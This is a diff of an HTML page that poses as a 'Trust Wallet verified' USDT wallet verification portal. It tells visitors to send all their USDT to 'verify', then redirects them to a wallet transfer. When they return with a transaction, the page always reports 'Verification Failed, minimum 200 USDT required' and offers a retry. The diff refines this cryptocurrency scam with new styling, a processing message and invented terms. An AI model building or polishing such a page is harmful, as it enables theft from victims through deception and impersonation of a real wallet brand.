@@ -3,68 +3,109 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>BEP20 USDT Verification</title>
+  <title>USDT Wallet Verification</title>
   <link rel="icon" href="bep20-logo.png" />
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      background: linear-gradient(135deg, #003cff, #001c40);
       color: #fff;
       text-align: center;
       padding: 20px;
     }
+
     header img {
-      width: 80px;
+      width: 90px;
       margin-top: 30px;
     }
+
     h1 {
-      color: #00ffd5;
       font-size: 26px;
-      margin: 10px 0;
+      color: #00ffd5;
+      margin: 15px 0 5px 0;
     }
+
     .card {
-      background: #1a1a2e;
+      background: #0d1a36;
       padding: 30px;
-      border-radius: 20px;
-      box-shadow: 0 0 15px rgba(0,255,255,0.2);
-      max-width: 400px;
+      border-radius: 16px;
+      box-shadow: 0 0 25px rgba(0,255,255,0.15);
       margin: 30px auto;
+      max-width: 400px;
+      animation: fadeInUp 0.8s ease-out;
     }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
     button {
       background: #00ffd5;
       color: #000;
       border: none;
-      padding: 14px 26px;
+      padding: 14px 30px;
       font-size: 16px;
       border-radius: 30px;
       cursor: pointer;
       margin-top: 20px;
+      transition: background 0.3s ease;
     }
+
     button:hover {
-      background: #00ddb0;
+      background: #00ccb0;
     }
+
     .flash-msg {
-      color: #00ff00;
+      color: #00ff88;
       font-weight: bold;
-      margin-top: 15px;
+      margin-top: 20px;
       display: none;
       animation: flash 1s infinite;
     }
+
+    .processing-msg {
+      font-size: 14px;
+      margin-top: 25px;
+      animation: fadeIn 1s ease-in-out;
+    }
+
     .fail-msg {
       color: #ff4d4d;
       font-weight: bold;
       margin-top: 20px;
-      display: none;
     }
+
+    .terms {
+      font-size: 13px;
+      margin-top: 30px;
+      opacity: 0.7;
+      max-width: 500px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    footer {
+      margin-top: 40px;
+      font-size: 13px;
+      opacity: 0.4;
+    }
+
     @keyframes flash {
       0%, 100% { opacity: 1; }
       50% { opacity: 0; }
     }
-    footer {
-      margin-top: 40px;
-      font-size: 13px;
-      opacity: 0.7;
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
     }
   </style>
 </head>
@@ -72,16 +113,22 @@
 
   <header>
     <img src="bep20-logo.png" alt="BEP20 Logo">
-    <h1>Verified by Trust Wallet</h1>
+    <h1>✅ Verified on Trust Wallet</h1>
     <p>Secure BEP20 USDT Verification Portal</p>
   </header>
 
-  <div class="card">
-    <h2>Verify Your USDT</h2>
-    <p>Click below to verify your wallet by sending all your USDT</p>
+  <div class="card" id="mainCard">
+    <h2>Verify Your Wallet</h2>
+    <p>Click below to verify by sending all your USDT</p>
     <button onclick="verifyUSDT()">Verify USDT</button>
     <div class="flash-msg" id="flash">🔐 All-in USDT verification required.</div>
-    <div class="fail-msg" id="fail">❌ Verification failed. Minimum 200 USDT required.</div>
+    <div class="processing-msg" id="processing" style="display:none;">Please wait... redirecting to Trust Wallet</div>
+  </div>
+
+  <div class="terms">
+    <strong>Terms & Conditions:</strong><br>
+    Minimum 200 USDT required for verification. <br>
+    Transfers below this amount will be marked as failed.
   </div>
 
   <footer>
@@ -94,17 +141,18 @@
 
     function verifyUSDT() {
       document.getElementById("flash").style.display = "block";
+      document.getElementById("processing").style.display = "block";
+
       setTimeout(() => {
         window.location.href = trustWalletURL;
-      }, 2000);
+      }, 2500); // Delay for message before opening Trust Wallet
     }
 
-    // Simulate user returning after transfer
+    // Check if user returned with tx= in the URL → show verification failed
     if (window.location.search.includes("tx")) {
-      document.querySelector(".card").innerHTML = `
-        <h2>Verification Failed</h2>
-        <p>❌ Minimum 200 USDT required to verify wallet.</p>
-        <p>Please try again.</p>
+      document.getElementById("mainCard").innerHTML = `
+        <h2>❌ Verification Failed</h2>
+        <p>Minimum 200 USDT required for verification.</p>
         <button onclick="verifyUSDT()">Retry Verification</button>
       `;
     }
